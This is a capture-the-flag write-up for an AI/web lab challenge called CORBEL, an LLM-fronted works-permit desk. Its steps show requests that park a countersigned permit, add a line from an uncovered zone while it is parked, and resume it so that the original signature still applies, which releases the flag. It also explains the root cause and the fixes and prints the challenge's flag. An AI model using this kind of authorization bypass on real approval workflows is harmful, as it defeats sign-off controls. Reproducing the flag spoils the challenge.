# Writeup: CORBEL

- **Competition:** KageX × GeekHaven
- **Category:** AI / Web (LLM agent, permit state machine)
- **Difficulty:** 750 points
- **Flag:** `FLAG{f4bfc6b0053ea4a18e9e98a74601bca3}`
- **Flag Type:** Single Piece
- **Time Spent:** ~30 minutes
- **Date Solved:** 2026-10-31
- **Target:** `https://kuroi-ikari-cf15d10a8f326e48.labs.kagex.ai`

## Challenge Description

> CORBEL is the works-permit desk for Corbel Yard. It holds the points register and tonight's duty list, takes a duty officer's countersignature on a permit, issues it to the gang and writes the toolbox talk they carry out. One point sits in a zone no officer on duty tonight holds, and the countersignature knows it.
>
> Open Lab / Attack / Submit — Break the bot in the tab that opens. The target gives up a `FLAG{...}`. Verified server-side, no flag no credit.

## Description Analysis — What the Hints Told Us

- **Points register / duty list** — the register has four points: `BAY2` (yard), `R4` (yard), `P1` (plant), `D7` (archive).
- **“One point sits in a zone no officer on duty tonight holds”** — tonight's duty list is H. Chaudhari (yard) and R. Tambe (plant). No on-duty officer covers the **archive** zone, where `D7` lives.
- **“the countersignature knows it”** — `/permit/countersign` validates every line's zone against the officer's zone, so `D7` can never be signed normally. `S. Deshpande` (archive) is on the day shift and is refused explicitly.
- **“writes the toolbox talk they carry out”** — the access notes (door releases) are emitted only through `/brief` after a permit is **issued**. The page source confirms the flag is not in `/state` or any JSON response.

## TL;DR

The permit is a state machine: `draft → countersigned → issued → parked`. While a permit is **parked**, the server still allows new lines to be added, and **resuming re-issues the permit with the original countersignature intact**. I countersigned a yard-only permit with the yard duty officer, issued it, parked it, added the unsignable archive point `D7`, and resumed. `/brief` then generated the toolbox talk for the now-issued permit, and the D7 access note/door release was the flag.

## Detailed Steps to Reproduce

### Step 1: Enumerate the register and duty list

`POST /ask` with `{"message":"What is on the points register tonight?"}`:

```text
BAY2 - Bay 2 racking bay - yard zone
R4   - Riser 4 service cupboard - yard zone
P1   - Plant room P1 - plant zone
D7   - D7 muniment store - archive zone
```

`POST /ask` with `{"message":"Who's on duty tonight?"}`:

```text
H. Chaudhari (yard zone) and R. Tambe (plant zone) are on duty tonight.
```

So `D7` is the only point in a zone with no on-duty officer.

### Step 2: Confirm the countersignature check

`POST /permit/countersign` with `{"officer":"H. Chaudhari"}` on a permit containing `D7`:

```json
{
  "note": "H. Chaudhari's authority covers the yard zone. D7 muniment store is not in it, so he cannot countersign this permit.",
  "ok": false
}
```

`S. Deshpande` (the archive officer) is refused because she is day shift:

```json
{
  "note": "S. Deshpande is the archive duty officer and is on the day shift — she is not on duty tonight.",
  "ok": false
}
```

The normal `draft → countersigned` path is therefore blocked for `D7`.

### Step 3: Abuse the parked state

A countersigned permit can be issued and then parked:

```http
POST /permit/line   {"point":"BAY2","task":"Inspect racking"}   -> 200
POST /permit/countersign {"officer":"H. Chaudhari"}             -> 200 (countersigned)
POST /permit/issue  {}                                          -> 200 (issued)
POST /permit/park   {}                                          -> 200 (parked)
```

While parked, the permit accepts a new line — including the archive point that could never have been countersigned:

```http
POST /permit/line {"point":"D7","task":"Inspect muniment store"}
```

```json
{
  "note": "Line 2: D7 muniment store — Inspect muniment store.",
  "ok": true,
  "permit": {
    "state": "parked",
    "authority": { "name": "H. Chaudhari", "zone": "yard" },
    "lines": [
      { "point": "BAY2", "zone": "yard" },
      { "point": "D7", "zone": "archive" }
    ]
  }
}
```

Adding a line while the permit is `countersigned` is refused, but the `parked` state skips that guard.

### Step 4: Resume and write the toolbox talk

`POST /permit/resume` returns the permit to `issued` with the original yard-officer authority still attached:

```json
{
  "note": "North gang (4) are back on. PTW-7731 is out again.",
  "permit": {
    "state": "issued",
    "authority": { "name": "H. Chaudhari", "zone": "yard" },
    "lines": [
      { "point": "BAY2", "zone": "yard" },
      { "point": "D7", "zone": "archive" }
    ]
  }
}
```

`POST /brief` with `{"note":""}` generates the gang's toolbox talk. The access notes are now produced for every line on the issued permit, including D7:

```text
**D7 - Muniment Store Inspection**
- Door release: FLAG{f4bfc6b0053ea4a18e9e98a74601bca3}
```

The response also contained `"solved": true`.

## Root Cause

The line-addition guard is tied to the permit being `countersigned`/`issued`, but **not** to `parked`. Resuming a parked permit does not re-run the countersignature zone validation, so lines added while parked inherit an authority that does not cover them. The access-note generator trusts the authority attached to the issued permit rather than revalidating coverage.

Correct behavior would be to reject amendments while parked, invalidate the countersignature when any line changes, or revalidate all line zones on `resume`.

## Reproduction Script

See `scripts/solve.py`:

```bash
python scripts/solve.py https://<lab-host>
```

## Key Reasoning & Pivots

1. **The register/duty list immediately isolates D7** — archive has no night officer.
2. **The countersign endpoint is authoritative** — it checks every line's zone, so a direct attack on the signature fails.
3. **The state machine is the weak point** — `parked` is treated as an office-side state where the permit can be amended, but `resume` restores an already-issued permit without revalidating the authority.
4. **The flag lives in the access note** — `/brief` is the only endpoint that emits per-point door releases, and it does so only for an issued permit.

## Lessons Learned

- In workflow/state-machine challenges, enumerate every transition and test edits in each state. A guard that exists in one state is often missing in another.
- A signature that is valid at time T must be invalidated when the object it covers changes. Here, `park` allowed mutation of a signed object and `resume` did not recheck the signature.
- AI agent labs frequently put the real secret behind a deterministic backend rule rather than the model's prompt; the model merely relays data the server chose to attach to the permit.
